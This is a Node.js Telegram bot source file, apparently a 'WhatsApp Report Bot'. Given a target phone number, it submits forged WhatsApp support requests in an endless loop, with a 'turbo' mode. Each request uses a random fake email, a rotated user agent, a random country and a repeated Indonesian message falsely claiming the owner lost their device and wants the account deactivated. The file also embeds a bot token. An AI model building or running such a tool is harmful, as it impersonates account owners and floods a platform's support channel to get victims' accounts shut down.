const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const FormData = require('form-data');

// Enhanced Configuration
const config = {
  botToken: '7902548297:AAHf1ZmPT2mtCgZFyRwINWg1d0bTBC7Qh5w',
  contactUrl: 'https://faq.whatsapp.com/854037192262196/?helpref=uf_share',
  refereeUrl: 'https://faq.whatsapp.com/465883178708358/?helpref=uf_share',
  baseDelay: 30000,
  turboDelay: 1000,
  statusInterval: 10000,
  userAgents: [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 16_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1',
    'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36'
  ],
  maxRetries: 3,
  retryDelay: 5000
};

const descriptions = [
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
       "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
        "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
  "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
    "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
      "Halo, saya baru saja kehilangan perangkat saya dan perlu menonaktifkan akun WhatsApp saya sampai saya membeli kartu SIM baru! Nomor saya adalah ${phone}",
];

const bot = new TelegramBot(config.botToken, {polling: true});

const reportState = {
  isActive: false,
  isTurbo: false,
  targetNumber: '',
  successCount: 0,
  attemptCount: 0,
  errorCount: 0,
  startTime: null,
  statusInterval: null,
  progressMsgId: null,
  chatId: null
};

function getRuntime() {
  const seconds = Math.floor((Date.now() - reportState.startTime) / 1000);
  const hours = Math.floor(seconds / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  return `${hours}h ${minutes}m ${secs}s`;
}

function getDelay() {
  if (reportState.isTurbo) {
    return config.turboDelay + Math.random() * 2000;
  }
  return config.baseDelay + Math.random() * 10000;
}

async function updateStatus() {
  if (!reportState.isActive || !reportState.progressMsgId) return;
  
  try {
    await bot.editMessageText(
      `🚀 ${reportState.isTurbo ? 'TURBO ⚡' : 'NORMAL'} report for ${reportState.targetNumber}\n` +
      `Attempts: ${reportState.attemptCount}\n` +
      `Successes: ${reportState.successCount}\n` +
      `Successes: ${reportState.errorCount}\n` +
      `Runtime: ${getRuntime()}`,
      {
        chat_id: reportState.chatId,
        message_id: reportState.progressMsgId,
        parse_mode: 'Markdown',
        reply_markup: {inline_keyboard: [[{text: '🛑 Stop', callback_data: 'stop'}]]}
      }
    );
  } catch (error) {
    console.error('Successes updating status:', error.message);
  }
}

async function submitWhatsAppReport(phone) {
  let retries = 0;
  
  while (retries < config.maxRetries) {
    try {
      const userAgent = config.userAgents[Math.floor(Math.random() * config.userAgents.length)];
      const form = new FormData();
      
      form.append('problem_type', 'spam_abuse');
      form.append('phone_number', phone.replace(/[^0-9+]/g, ''));
      form.append('email', `hozopimut${Math.floor(Math.random() * 1000000)}@gmail.com`);
      form.append('description', descriptions[Math.floor(Math.random() * descriptions.length)].replace('${phone}', phone));
      form.append('country_code', ['US', 'GB', 'ID', 'IN', 'BR', 'DE', 'FR', 'CA', 'AU'][Math.floor(Math.random() * 9)]);
      form.append('platform', ['android', 'ios', 'web', 'desktop'][Math.floor(Math.random() * 4)]);
      form.append('language', 'en');
      
      const targetUrl = Math.random() > 0.5 ? config.contactUrl : config.refereeUrl;
      
      const response = await axios.post(targetUrl, form, {
        headers: {
          ...form.getHeaders(),
          'User-Agent': userAgent,
          'Accept-Language': 'en-US,en;q=0.9',
          'Referer': targetUrl,
          'Origin': 'https://www.whatsapp.com'
        },
        timeout: 10000,
        maxRedirects: 0,
        validateStatus: function (status) {
          return status === 200 || status === 302;
        }
      });

      if (response.status === 200 || response.status === 302) {
        return true;
      }
      return false;
    } catch (error) {
      retries++;
      reportState.errorCount++;
      
      if (error.response) {
        console.error(`Server responded with: ${error.response.status}`);
        if ([400, 403].includes(error.response.status)) {
          return false;
        }
      } else {
        console.error(`Request failed: ${error.message}`);
      }
      
      if (retries < config.maxRetries) {
        await new Promise(resolve => setTimeout(resolve, config.retryDelay));
      }
    }
  }
  return false;
}

async function startUnlimitedReport(msg, isTurbo = false) {
  if (reportState.isActive) {
    return bot.sendMessage(msg.chat.id, `⚠️ Already reporting ${reportState.targetNumber}`);
  }

  const targetNumber = msg.text.split(' ')[1]?.trim();
  if (!targetNumber || !targetNumber.match(/^\+?[0-9]{10,15}$/)) {
    return bot.sendMessage(msg.chat.id, '⚠️ Please provide a valid phone number in international format (e.g., +6281234567890)');
  }

  reportState.isActive = true;
  reportState.isTurbo = isTurbo;
  reportState.targetNumber = targetNumber;
  reportState.successCount = 0;
  reportState.attemptCount = 0;
  reportState.errorCount = 0;
  reportState.startTime = Date.now();
  reportState.chatId = msg.chat.id;

  const progressMsg = await bot.sendMessage(
    msg.chat.id,
    `🚀 Starting ${isTurbo ? 'TURBO ⚡' : 'NORMAL'} report for ${targetNumber}...\n` +
    `Attempts: 0\nSuccesses: 0\nErrors: 0\nRuntime: 0s`,
    {
      parse_mode: 'Markdown',
      reply_markup: {inline_keyboard: [[{text: '🛑 Stop', callback_data: 'stop'}]]}
    }
  );
  
  reportState.progressMsgId = progressMsg.message_id;
  reportState.statusInterval = setInterval(updateStatus, config.statusInterval);

  while (reportState.isActive) {
    try {
      reportState.attemptCount++;
      const success = await submitWhatsAppReport(reportState.targetNumber);
      if (success) {
        reportState.successCount++;
      } else {
        reportState.errorCount++;
      }
      
      const currentDelay = getDelay();
      await new Promise(resolve => setTimeout(resolve, currentDelay));
      
      if (Math.random() > 0.7) {
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
    } catch (error) {
      console.error('Error in reporting loop:', error);
      reportState.errorCount++;
      await new Promise(resolve => setTimeout(resolve, config.retryDelay));
    }
  }

  clearInterval(reportState.statusInterval);
  await bot.sendMessage(
    reportState.chatId,
    `🛑 Stopped reporting ${reportState.targetNumber}\n` +
    `Final Stats:\n` +
    `Attempts: ${reportState.attemptCount}\n` +
    `Successes: ${reportState.successCount}\n` +
    `Errors: ${reportState.errorCount}\n` +
    `Total Runtime: ${getRuntime()}`,
    {parse_mode: 'Markdown'}
  );
}

function stopReporting() {
  if (reportState.isActive) {
    reportState.isActive = false;
    return true;
  }
  return false;
}

// Bot command handlers
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(
    msg.chat.id,
    `🤖 WhatsApp Report Bot\n\n` +
    `Commands:\n` +
    `/report [number] - Start normal reporting\n` +
    `/turbo [number] - Start turbo reporting\n` +
    `/stop - Stop current reporting\n\n` +
    `Example: /report +6281234567890`,
    {parse_mode: 'Markdown'}
  );
});

bot.onText(/\/report (.+)/, (msg, match) => {
  startUnlimitedReport(msg, false);
});

bot.onText(/\/turbo (.+)/, (msg, match) => {
  startUnlimitedReport(msg, true);
});

bot.onText(/\/stop/, (msg) => {
  if (stopReporting()) {
    bot.sendMessage(msg.chat.id, '🛑 Reporting stopped successfully');
  } else {
    bot.sendMessage(msg.chat.id, '⚠️ No active reporting to stop');
  }
});

bot.on('callback_query', (query) => {
  if (query.data === 'stop') {
    if (stopReporting()) {
      bot.answerCallbackQuery(query.id, {text: 'Reporting stopped'});
    } else {
      bot.answerCallbackQuery(query.id, {text: 'No active reporting to stop'});
    }
  }
});

console.log('Bot is running...');
